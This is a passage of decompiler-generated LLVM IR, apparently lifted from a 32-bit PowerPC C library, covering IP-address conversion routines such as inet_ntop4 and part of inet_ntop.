  %v5_10013e70 = inttoptr i32 %v4_10013e70 to i8*
  store i8 %v3_10013e70, i8* %v5_10013e70, align 1
  %v0_10013e74.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_10013e74.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_10013e7c.pre = load i32, i32* @r27, align 4
  %v3_10013e74 = icmp slt i32 %v1_10013e74.pre, %v0_10013e74.pre
  %v2_10013e78 = sub i32 %v1_10013e74.pre, %v0_10013e74.pre
  store i32 %v2_10013e78, i32* %r10.global-to-local, align 4
  %v1_10013e80 = add i32 %v0_10013e74.pre, 1
  store i32 %v1_10013e80, i32* %r9.global-to-local, align 4
  br i1 %v3_10013e74, label %dec_label_pc_10013e8c.thread, label %dec_label_pc_10013e68.dec_label_pc_10013e68_crit_edge

dec_label_pc_10013e68.dec_label_pc_10013e68_crit_edge: ; preds = %dec_label_pc_10013e68
  %v2_10013e7c = sub i32 %v1_10013e7c.pre, %v0_10013e74.pre
  %v0_10013e68.pre = load i32, i32* @r24, align 4
  br label %dec_label_pc_10013e68

dec_label_pc_10013e8c.thread:                     ; preds = %dec_label_pc_10013e68, %dec_label_pc_10013e74.preheader
  %v0_10013e88.lcssa = phi i32 [ %v1_10013e8c.pre, %dec_label_pc_10013e74.preheader ], [ %v1_10013e7c.pre, %dec_label_pc_10013e68 ]
  store i32 %v0_10013e88.lcssa, i32* @r31, align 4
  br label %dec_label_pc_10013e94

dec_label_pc_10013e8c:                            ; preds = %dec_label_pc_10013e48
  br i1 %v4_10013e8c, label %dec_label_pc_10013e94, label %dec_label_pc_10013ec0

dec_label_pc_10013e94:                            ; preds = %dec_label_pc_10013e8c.thread, %dec_label_pc_10013e8c
  %v0_10013e94 = load i32, i32* @r22, align 4
  store i32 %v0_10013e94, i32* @r3, align 4
  store i32 %v2_10013d10, i32* @r4, align 4
  store i32 16, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10013ea4.733 to i32), i32* @lr, align 4
  %v0_10013ea0 = call i32 @memcpy()
  store i32 %v0_10013ea0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10013ec4

dec_label_pc_10013eac:                            ; preds = %dec_label_pc_10013cf0
  %v0_10013eac = call i32 @__errno_location()
  store i32 %v0_10013eac, i32* %r3.global-to-local, align 4
  store i32 97, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_10013eb8 = inttoptr i32 %v0_10013eac to i32*
  store i32 97, i32* %v2_10013eb8, align 4
  %v0_10013ec8.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10013ec4

dec_label_pc_10013ec0:                            ; preds = %dec_label_pc_10013db4, %dec_label_pc_10013da8, %dec_label_pc_10013d6c, %dec_label_pc_10013d94, %dec_label_pc_10013e50, %dec_label_pc_10013df4, %dec_label_pc_10013de0, %dec_label_pc_10013e8c, %dec_label_pc_10013d34, %dec_label_pc_10013e2c, %dec_label_pc_10013de8
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10013ec4

dec_label_pc_10013ec4:                            ; preds = %dec_label_pc_10013eac, %dec_label_pc_10013e94, %dec_label_pc_10013cfc, %dec_label_pc_10013ec0
  %v0_10013ec8 = phi i32 [ %v0_10013ec8.pre, %dec_label_pc_10013eac ], [ 1, %dec_label_pc_10013e94 ], [ %v3_10013d04, %dec_label_pc_10013cfc ], [ 0, %dec_label_pc_10013ec0 ]
  store i32 %v0_10013cd4, i32* %r0.global-to-local, align 4
  store i32 %v0_10013ec8, i32* %r3.global-to-local, align 4
  ret i32 %v0_10013ec8

; uselistorder directives
  uselistorder i32 %v0_10013ec8, { 1, 0 }
  uselistorder i32 %v2_10013e78, { 1, 0 }
  uselistorder i32 %v0_10013e74.pre, { 0, 2, 1, 3 }
  uselistorder i1 %v4_10013e8c, { 1, 0 }
  uselistorder i32 %v0_10013e8c.pre, { 1, 0 }
  uselistorder i32 %v0_10013e38, { 1, 0 }
  uselistorder i32 %v0_10013e8c.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v1_10013e18, { 1, 2, 3, 0 }
  uselistorder i32 %v0_10013dc0, { 1, 0 }
  uselistorder i32 %v1_10013d70, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 9, 10, 5, 6, 7, 8 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 9, 10, 6, 7, 16, 15, 8, 18, 17, 11, 12, 13, 14, 0 }
  uselistorder i32 58, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 (i32)* @__GI_tolower, { 2, 1, 0 }
  uselistorder i32 268516892, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder label %dec_label_pc_10013ec4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10013ec0, { 7, 4, 9, 5, 10, 6, 0, 1, 3, 2, 8 }
  uselistorder label %dec_label_pc_10013e94, { 1, 0 }
  uselistorder label %dec_label_pc_10013e68, { 1, 0 }
  uselistorder label %dec_label_pc_10013e48, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10013e24, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10013d4c.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_10013d4c, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10013f34.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r12.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i16, align 2
  %stack_var_-54 = alloca i32, align 4
  %v0_10013edc = load i32, i32* @lr, align 4
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg3, i32* @r30, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r5.global-to-local, align 4
  %v2_10013f08 = ptrtoint i32* %stack_var_-54 to i32
  store i32 %v2_10013f08, i32* %r3.global-to-local, align 4
  store i32 100, i32* @r28, align 4
  store i16 0, i16* %stack_var_-56, align 2
  store i32 ptrtoint (i32* @global_var_10013f18.736 to i32), i32* @lr, align 4
  %v3_10013f14 = call i32 @__GI_memset(i32 %v2_10013f08, i32 0, i32 15)
  store i32 %v3_10013f14, i32* %r3.global-to-local, align 4
  store i32 5, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 10, i32* %r5.global-to-local, align 4
  store i32 46, i32* %r12.global-to-local, align 4
  %v0_10013fd82 = load i32, i32* @r1, align 4
  store i32 %v0_10013fd82, i32* %r7.global-to-local, align 4
  store i32 4, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10013f34

dec_label_pc_10013f34:                            ; preds = %dec_label_pc_10013fa8.dec_label_pc_10013f34_crit_edge, %dec_label_pc_10013f34.lr.ph
  %v2_10013f54 = phi i32 [ %v2_10013fd8, %dec_label_pc_10013fa8.dec_label_pc_10013f34_crit_edge ], [ %v0_10013fd82, %dec_label_pc_10013f34.lr.ph ]
  %v0_10013f48 = phi i32 [ %v0_10013fd8, %dec_label_pc_10013fa8.dec_label_pc_10013f34_crit_edge ], [ %v0_10013fd82, %dec_label_pc_10013f34.lr.ph ]
  %v0_10013f38 = phi i32 [ %v1_10013fd8, %dec_label_pc_10013fa8.dec_label_pc_10013f34_crit_edge ], [ 0, %dec_label_pc_10013f34.lr.ph ]
  %v1_10013f40 = phi i32 [ %v1_10013f34.pre, %dec_label_pc_10013fa8.dec_label_pc_10013f34_crit_edge ], [ 0, %dec_label_pc_10013f34.lr.ph ]
  %v0_10013f34 = load i32, i32* %r31.global-to-local, align 4
  %v2_10013f34 = add i32 %v0_10013f34, %v1_10013f40
  %v3_10013f34 = inttoptr i32 %v2_10013f34 to i8*
  %v4_10013f34 = load i8, i8* %v3_10013f34, align 1
  %v5_10013f34 = zext i8 %v4_10013f34 to i32
  store i32 %v5_10013f34, i32* %r10.global-to-local, align 4
  store i32 %v0_10013f38, i32* %r8.global-to-local, align 4
  %v1_10013f3c = add i32 %v0_10013f38, 1
  store i32 %v1_10013f3c, i32* %r11.global-to-local, align 4
  store i32 %v2_10013f34, i32* %r3.global-to-local, align 4
  %v1_10013f44 = load i32, i32* @r28, align 4
  %v2_10013f44 = udiv i32 %v5_10013f34, %v1_10013f44
  %v2_10013f48 = add i32 %v1_10013f3c, %v0_10013f48
  store i32 %v2_10013f48, i32* %r6.global-to-local, align 4
  %v1_10013f4c = add nuw nsw i32 %v2_10013f44, 48
  %v1_10013f50 = urem i32 %v1_10013f4c, 256
  store i32 %v1_10013f50, i32* %r0.global-to-local, align 4
  %v1_10013f54 = trunc i32 %v1_10013f4c to i8
  %v3_10013f54 = add i32 %v2_10013f54, 8
  %v4_10013f54 = inttoptr i32 %v3_10013f54 to i8*
  store i8 %v1_10013f54, i8* %v4_10013f54, align 1
  %v0_10013f58 = load i32, i32* %r0.global-to-local, align 4
  %v3_10013f58 = icmp eq i32 %v0_10013f58, 48
  %v0_10013f60 = load i32, i32* %r10.global-to-local, align 4
  %v1_10013f60 = load i32, i32* %r5.global-to-local, align 4
  %v2_10013f60 = udiv i32 %v0_10013f60, %v1_10013f60
  store i32 %v2_10013f60, i32* %r9.global-to-local, align 4
  br i1 %v3_10013f58, label %dec_label_pc_10013f60, label %dec_label_pc_10013f8c

dec_label_pc_10013f60:                            ; preds = %dec_label_pc_10013f34
  %v2_10013f64 = udiv i32 %v2_10013f60, %v1_10013f60
  %tmp18 = mul i32 %v2_10013f64, -10
  %v2_10013f6c = add i32 %v2_10013f60, 48
  %v1_10013f70 = add i32 %v2_10013f6c, %tmp18
  store i32 %v1_10013f70, i32* %r9.global-to-local, align 4
  %v1_10013f74 = urem i32 %v1_10013f70, 256
  store i32 %v1_10013f74, i32* %r0.global-to-local, align 4
  %v1_10013f78 = trunc i32 %v1_10013f70 to i8
  %v2_10013f78 = load i32, i32* %r7.global-to-local, align 4
  %v3_10013f78 = add i32 %v2_10013f78, 8
  %v4_10013f78 = inttoptr i32 %v3_10013f78 to i8*
  store i8 %v1_10013f78, i8* %v4_10013f78, align 1
  %v0_10013f7c = load i32, i32* %r0.global-to-local, align 4
  %v3_10013f7c = icmp eq i32 %v0_10013f7c, 48
  br i1 %v3_10013f7c, label %dec_label_pc_10013fa8, label %dec_label_pc_10013f84

dec_label_pc_10013f84:                            ; preds = %dec_label_pc_10013f60
  %v0_10013f84 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10013f84, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10013fa8

dec_label_pc_10013f8c:                            ; preds = %dec_label_pc_10013f34
  %v0_10013f90 = load i32, i32* %r11.global-to-local, align 4
  %v1_10013f90 = add i32 %v0_10013f90, 1
  store i32 %v1_10013f90, i32* %r8.global-to-local, align 4
  %v2_10013f94 = udiv i32 %v2_10013f60, %v1_10013f60
  %v1_10013f98 = mul i32 %v2_10013f94, 10
  store i32 %v1_10013f98, i32* %r0.global-to-local, align 4
  %v2_10013f9c = sub i32 %v2_10013f60, %v1_10013f98
  %v1_10013fa0 = add i32 %v2_10013f9c, 48
  store i32 %v1_10013fa0, i32* %r9.global-to-local, align 4
  %v1_10013fa4 = trunc i32 %v1_10013fa0 to i8
  %v2_10013fa4 = load i32, i32* %r6.global-to-local, align 4
  %v3_10013fa4 = add i32 %v2_10013fa4, 8
  %v4_10013fa4 = inttoptr i32 %v3_10013fa4 to i8*
  store i8 %v1_10013fa4, i8* %v4_10013fa4, align 1
  br label %dec_label_pc_10013fa8

dec_label_pc_10013fa8:                            ; preds = %dec_label_pc_10013f60, %dec_label_pc_10013f84, %dec_label_pc_10013f8c
  %v0_10013fa8 = load i32, i32* %r3.global-to-local, align 4
  %v1_10013fa8 = inttoptr i32 %v0_10013fa8 to i8*
  %v2_10013fa8 = load i8, i8* %v1_10013fa8, align 1
  %v3_10013fa8 = zext i8 %v2_10013fa8 to i32
  %v0_10013fac = load i32, i32* %r8.global-to-local, align 4
  %v1_10013fac = add i32 %v0_10013fac, 1
  %v0_10013fb0 = load i32, i32* @r1, align 4
  %v2_10013fb0 = add i32 %v0_10013fb0, %v0_10013fac
  store i32 %v2_10013fb0, i32* %r10.global-to-local, align 4
  %v2_10013fb4 = add i32 %v1_10013fac, %v0_10013fb0
  store i32 %v2_10013fb4, i32* %r8.global-to-local, align 4
  %v1_10013fb8 = load i32, i32* %r5.global-to-local, align 4
  %v2_10013fb8 = udiv i32 %v3_10013fa8, %v1_10013fb8
  %v1_10013fbc = add i32 %v0_10013fac, 2
  store i32 %v1_10013fbc, i32* %r11.global-to-local, align 4
  %v0_10013fc0 = load i32, i32* %r4.global-to-local, align 4
  %v1_10013fc0 = add i32 %v0_10013fc0, 1
  store i32 %v1_10013fc0, i32* %r4.global-to-local, align 4
  %v1_10013fc4 = mul nuw nsw i32 %v2_10013fb8, 10
  store i32 %v1_10013fc4, i32* %r0.global-to-local, align 4
  %v2_10013fc8 = sub nsw i32 %v3_10013fa8, %v1_10013fc4
  %v1_10013fcc = add nsw i32 %v2_10013fc8, 48
  store i32 %v1_10013fcc, i32* %r9.global-to-local, align 4
  %v1_10013fd0 = trunc i32 %v1_10013fcc to i8
  %v3_10013fd0 = add i32 %v2_10013fb0, 8
  %v4_10013fd0 = inttoptr i32 %v3_10013fd0 to i8*
  store i8 %v1_10013fd0, i8* %v4_10013fd0, align 1
  %v0_10013fd4 = load i32, i32* %r12.global-to-local, align 4
  %v1_10013fd4 = trunc i32 %v0_10013fd4 to i8
  %v2_10013fd4 = load i32, i32* %r8.global-to-local, align 4
  %v3_10013fd4 = add i32 %v2_10013fd4, 8
  %v4_10013fd4 = inttoptr i32 %v3_10013fd4 to i8*
  store i8 %v1_10013fd4, i8* %v4_10013fd4, align 1
  %v0_10013fd8 = load i32, i32* @r1, align 4
  %v1_10013fd8 = load i32, i32* %r11.global-to-local, align 4
  %v2_10013fd8 = add i32 %v1_10013fd8, %v0_10013fd8
  store i32 %v2_10013fd8, i32* %r7.global-to-local, align 4
  %v0_10013fdc = load i32, i32* %ctr.global-to-local, align 4
  %v1_10013fdc = add i32 %v0_10013fdc, -1
  store i32 %v1_10013fdc, i32* %ctr.global-to-local, align 4
  %v2_10013fdc = icmp eq i32 %v1_10013fdc, 0
  br i1 %v2_10013fdc, label %dec_label_pc_10013fe0, label %dec_label_pc_10013fa8.dec_label_pc_10013f34_crit_edge

dec_label_pc_10013fa8.dec_label_pc_10013f34_crit_edge: ; preds = %dec_label_pc_10013fa8
  %v1_10013f34.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10013f34

dec_label_pc_10013fe0:                            ; preds = %dec_label_pc_10013fa8
  %v2_10013fe0 = ptrtoint i16* %stack_var_-56 to i32
  store i32 %v2_10013fe0, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10013fe8 = add i32 %v1_10013fd8, %v2_10013fe0
  store i32 %v2_10013fe8, i32* %r9.global-to-local, align 4
  store i32 %v2_10013fe0, i32* @r3, align 4
  %v3_10013ff0 = add i32 %v2_10013fe8, -1
  %v4_10013ff0 = inttoptr i32 %v3_10013ff0 to i8*
  store i8 0, i8* %v4_10013ff0, align 1
  %v0_10013ff4 = call i32 @__GI_strlen()
  store i32 %v0_10013ff4, i32* %r3.global-to-local, align 4
  %v1_10013ff8 = load i32, i32* @r30, align 4
  %v3_10013ff8 = icmp ugt i32 %v0_10013ff4, %v1_10013ff8
  br i1 %v3_10013ff8, label %dec_label_pc_10014000, label %dec_label_pc_10014014

dec_label_pc_10014000:                            ; preds = %dec_label_pc_10013fe0
  %v0_10014000 = call i32 @__errno_location()
  store i32 %v0_10014000, i32* %r3.global-to-local, align 4
  store i32 28, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_1001400c = inttoptr i32 %v0_10014000 to i32*
  store i32 28, i32* %v2_1001400c, align 4
  %v0_10014028.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10014024

dec_label_pc_10014014:                            ; preds = %dec_label_pc_10013fe0
  %v0_10014014 = load i32, i32* @r29, align 4
  store i32 %v0_10014014, i32* %r3.global-to-local, align 4
  store i32 %v2_10013fe0, i32* %r4.global-to-local, align 4
  %v2_1001401c = bitcast i16* %stack_var_-56 to i8*
  %v3_1001401c = call i32 @strcpy(i32 %v0_10014014, i8* %v2_1001401c)
  store i32 %v3_1001401c, i32* %r3.global-to-local, align 4
  store i32 %v3_1001401c, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10014024

dec_label_pc_10014024:                            ; preds = %dec_label_pc_10014000, %dec_label_pc_10014014
  %v0_10014028 = phi i32 [ %v0_10014028.pre, %dec_label_pc_10014000 ], [ %v3_1001401c, %dec_label_pc_10014014 ]
  store i32 %v0_10013edc, i32* %r0.global-to-local, align 4
  store i32 %v0_10014028, i32* %r3.global-to-local, align 4
  ret i32 %v0_10014028

; uselistorder directives
  uselistorder i32 %v0_10014028, { 1, 0 }
  uselistorder i32 %v2_10013fe0, { 1, 2, 0, 3 }
  uselistorder i32 %v1_10013fdc, { 1, 0 }
  uselistorder i32 %v2_10013fd8, { 1, 0 }
  uselistorder i32 %v0_10013fac, { 1, 0, 2 }
  uselistorder i32 %v1_10013f70, { 1, 0, 2 }
  uselistorder i32 %v2_10013f60, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_10013f4c, { 1, 0 }
  uselistorder i32 %v0_10013f38, { 1, 0 }
  uselistorder i32 %v0_10013fd82, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i16 0, { 13, 11, 0, 1, 2, 3, 4, 12, 5, 6, 7, 8, 9, 10, 14, 15, 16, 17, 18, 19 }
  uselistorder i32 15, { 0, 3, 1, 8, 9, 4, 5, 6, 2, 7 }
  uselistorder i32 268566528, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10014024, { 1, 0 }
  uselistorder label %dec_label_pc_10013fa8, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %v1_1001403c = icmp slt i32 %arg1, 2
  %v3_1001403c = icmp eq i32 %arg1, 2
  store i1 %v1_1001403c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001403c, i1* %cr7_eq.global-to-local, align 1
  store i32 %arg2, i32* @r27, align 4
  store i32 %arg3, i32* @r25, align 4
  store i32 %arg4, i32* @r26, align 4
  br i1 %v3_1001403c, label %dec_label_pc_1001406c, label %dec_label_pc_10014060

dec_label_pc_10014060:                            ; preds = %entry
  %v1_10014060 = icmp slt i32 %arg1, 10
  %v3_10014060 = icmp eq i32 %arg1, 10
  store i1 %v1_10014060, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10014060, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10014060, label %dec_label_pc_100140a4.lr.ph, label %dec_label_pc_100142b8

dec_label_pc_1001406c:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_1001407c.738 to i32), i32* @lr, align 4
  %v3_10014078 = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_100142b0

dec_label_pc_100140a4.lr.ph:                      ; preds = %dec_label_pc_10014060
  %v2_10014080 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_10014080, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10014094.739 to i32), i32* @lr, align 4
  %v3_10014090 = call i32 @__GI_memset(i32 %v2_10014080, i32 0, i32 32)
  store i32 0, i32* %r11.global-to-local, align 4
  %v0_100140c415 = load i32, i32* @r27, align 4
  store i32 %v0_100140c415, i32* %r9.global-to-local, align 4
  store i32 8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_100140a4

dec_label_pc_100140a4:                            ; preds = %dec_label_pc_100140a4.lr.ph, %dec_label_pc_100140a4
  %v1_100140b8 = phi i32 [ 0, %dec_label_pc_100140a4.lr.ph ], [ %v1_100140c8, %dec_label_pc_100140a4 ]
  %v0_100140a4 = phi i32 [ %v0_100140c415, %dec_label_pc_100140a4.lr.ph ], [ %v0_100140c4, %dec_label_pc_100140a4 ]
  %v0_100140ac = phi i32 [ %v0_100140c415, %dec_label_pc_100140a4.lr.ph ], [ %v2_100140c4, %dec_label_pc_100140a4 ]
  %v1_100140a4 = phi i32 [ 0, %dec_label_pc_100140a4.lr.ph ], [ %v0_100140bc, %dec_label_pc_100140a4 ]
  %v2_100140a4 = add i32 %v0_100140a4, %v1_100140a4
  %v3_100140a4 = inttoptr i32 %v2_100140a4 to i8*
  %v4_100140a4 = load i8, i8* %v3_100140a4, align 1
  %v5_100140a4 = zext i8 %v4_100140a4 to i32
  %v1_100140a8 = add i32 %v1_100140a4, 2
  store i32 %v1_100140a8, i32* %r11.global-to-local, align 4
  %v1_100140ac = add i32 %v0_100140ac, 1
  %v2_100140ac = inttoptr i32 %v1_100140ac to i8*
  %v3_100140ac = load i8, i8* %v2_100140ac, align 1
  %v4_100140ac = zext i8 %v3_100140ac to i32
  %v1_100140b0 = mul nuw nsw i32 %v5_100140a4, 256
  %v2_100140b4 = or i32 %v4_100140ac, %v1_100140b0
  %v2_100140b8 = load i32, i32* %r29.global-to-local, align 4
  %v3_100140b8 = add i32 %v2_100140b8, %v1_100140b8
  %v4_100140b8 = inttoptr i32 %v3_100140b8 to i32*
  store i32 %v2_100140b4, i32* %v4_100140b8, align 4
  %v0_100140bc = load i32, i32* %r11.global-to-local, align 4
  %v1_100140bc = udiv i32 %v0_100140bc, 2
  %v0_100140c4 = load i32, i32* @r27, align 4
  %v2_100140c4 = add i32 %v0_100140c4, %v0_100140bc
  store i32 %v2_100140c4, i32* %r9.global-to-local, align 4
  %v1_100140c8 = mul i32 %v1_100140bc, 4
  %v0_100140cc = load i32, i32* %ctr.global-to-local, align 4
  %v1_100140cc = add i32 %v0_100140cc, -1
  store i32 %v1_100140cc, i32* %ctr.global-to-local, align 4
  %v2_100140cc = icmp eq i32 %v1_100140cc, 0
  br i1 %v2_100140cc, label %dec_label_pc_100140ec.lr.ph, label %dec_label_pc_100140a4

dec_label_pc_100140ec.lr.ph:                      ; preds = %dec_label_pc_100140a4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 -1, i32* @r28, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  store i32 8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_100140ec

dec_label_pc_100140ec:                            ; preds = %dec_label_pc_100140ec.lr.ph, %dec_label_pc_10014138
  %v0_1001413c = phi i32 [ 8, %dec_label_pc_100140ec.lr.ph ], [ %v1_1001413c, %dec_label_pc_10014138 ]
  %v0_1001412c = phi i32 [ -1, %dec_label_pc_100140ec.lr.ph ], [ %v0_1001412c42, %dec_label_pc_10014138 ]
  %v0_1001411c = phi i32 [ -1, %dec_label_pc_100140ec.lr.ph ], [ %v0_1001411c39, %dec_label_pc_10014138 ]
  %v0_100140f0 = phi i32 [ -1, %dec_label_pc_100140ec.lr.ph ], [ %v0_100140f035, %dec_label_pc_10014138 ]
  %v0_10014138 = phi i32 [ 0, %dec_label_pc_100140ec.lr.ph ], [ %v1_10014138, %dec_label_pc_10014138 ]
  %v1_100140ec = mul i32 %v0_10014138, 4
  %v3_100140f0 = icmp eq i32 %v0_100140f0, -1
  %v2_100140f4 = add i32 %v1_100140ec, %v2_10014080
  %v3_100140f4 = inttoptr i32 %v2_100140f4 to i32*
  %v4_100140f4 = load i32, i32* %v3_100140f4, align 4
  %v3_100140f8 = icmp eq i32 %v4_100140f4, 0
  br i1 %v3_100140f8, label %dec_label_pc_10014100, label %dec_label_pc_10014118

dec_label_pc_10014100:                            ; preds = %dec_label_pc_100140ec
  br i1 %v3_100140f0, label %dec_label_pc_10014104, label %dec_label_pc_10014110

dec_label_pc_10014104:                            ; preds = %dec_label_pc_10014100
  store i32 %v0_10014138, i32* %r9.global-to-local, align 4
  store i32 1, i32* @r31, align 4
  br label %dec_label_pc_10014138

dec_label_pc_10014110:                            ; preds = %dec_label_pc_10014100
  %v0_10014110 = load i32, i32* @r31, align 4
  %v1_10014110 = add i32 %v0_10014110, 1
  store i32 %v1_10014110, i32* @r31, align 4
  br label %dec_label_pc_10014138

dec_label_pc_10014118:                            ; preds = %dec_label_pc_100140ec
  br i1 %v3_100140f0, label %dec_label_pc_10014138, label %dec_label_pc_1001411c

dec_label_pc_1001411c:                            ; preds = %dec_label_pc_10014118
  %v3_1001411c = icmp eq i32 %v0_1001411c, -1
  %v0_10014130.pre = load i32, i32* @r31, align 4
  %v1_10014124 = load i32, i32* @r30, align 4
  %v3_10014124 = icmp sgt i32 %v0_10014130.pre, %v1_10014124
  %or.cond = or i1 %v3_1001411c, %v3_10014124
  br i1 %or.cond, label %dec_label_pc_1001412c, label %dec_label_pc_10014134

dec_label_pc_1001412c:                            ; preds = %dec_label_pc_1001411c
  store i32 %v0_1001412c, i32* @r28, align 4
  store i32 %v0_10014130.pre, i32* @r30, align 4
  br label %dec_label_pc_10014134

dec_label_pc_10014134:                            ; preds = %dec_label_pc_1001411c, %dec_label_pc_1001412c
  %v0_1001411c40 = phi i32 [ %v0_1001412c, %dec_label_pc_1001412c ], [ %v0_1001411c, %dec_label_pc_1001411c ]
  store i32 -1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10014138

dec_label_pc_10014138:                            ; preds = %dec_label_pc_10014118, %dec_label_pc_10014110, %dec_label_pc_10014104, %dec_label_pc_10014134
  %v0_1001412c42 = phi i32 [ %v0_1001412c, %dec_label_pc_10014118 ], [ %v0_1001412c, %dec_label_pc_10014110 ], [ %v0_10014138, %dec_label_pc_10014104 ], [ -1, %dec_label_pc_10014134 ]
  %v0_100140f035 = phi i32 [ -1, %dec_label_pc_10014118 ], [ %v0_100140f0, %dec_label_pc_10014110 ], [ %v0_10014138, %dec_label_pc_10014104 ], [ -1, %dec_label_pc_10014134 ]
  %v0_1001411c39 = phi i32 [ %v0_1001411c, %dec_label_pc_10014118 ], [ %v0_1001411c, %dec_label_pc_10014110 ], [ %v0_1001411c, %dec_label_pc_10014104 ], [ %v0_1001411c40, %dec_label_pc_10014134 ]
  %v1_10014138 = add nuw nsw i32 %v0_10014138, 1
  store i32 %v1_10014138, i32* %r11.global-to-local, align 4
  %v1_1001413c = add nsw i32 %v0_1001413c, -1
  store i32 %v1_1001413c, i32* %ctr.global-to-local, align 4
  %v2_1001413c = icmp eq i32 %v1_1001413c, 0
  br i1 %v2_1001413c, label %dec_label_pc_10014140, label %dec_label_pc_100140ec

dec_label_pc_10014140:                            ; preds = %dec_label_pc_10014138
  %v3_10014140 = icmp eq i32 %v0_1001412c42, -1
  %v1_10014160 = icmp slt i32 %v0_1001411c39, -1
  %v3_10014160 = icmp eq i32 %v0_1001411c39, -1
  store i1 %v1_10014160, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10014160, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10014140, label %dec_label_pc_10014160, label %dec_label_pc_10014148

dec_label_pc_10014148:                            ; preds = %dec_label_pc_10014140
  %v0_10014158.pre = load i32, i32* @r31, align 4
  br i1 %v3_10014160, label %dec_label_pc_10014158, label %dec_label_pc_10014150

dec_label_pc_10014150:                            ; preds = %dec_label_pc_10014148
  %v1_10014150 = load i32, i32* @r30, align 4
  %v2_10014150 = icmp slt i32 %v0_10014158.pre, %v1_10014150
  %v3_10014150 = icmp sgt i32 %v0_10014158.pre, %v1_10014150
  %v4_10014150 = icmp eq i32 %v0_10014158.pre, %v1_10014150
  store i1 %v2_10014150, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10014150, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10014150, label %dec_label_pc_10014158, label %dec_label_pc_10014160.thread

dec_label_pc_10014158:                            ; preds = %dec_label_pc_10014148, %dec_label_pc_10014150
  store i32 %v0_10014158.pre, i32* @r30, align 4
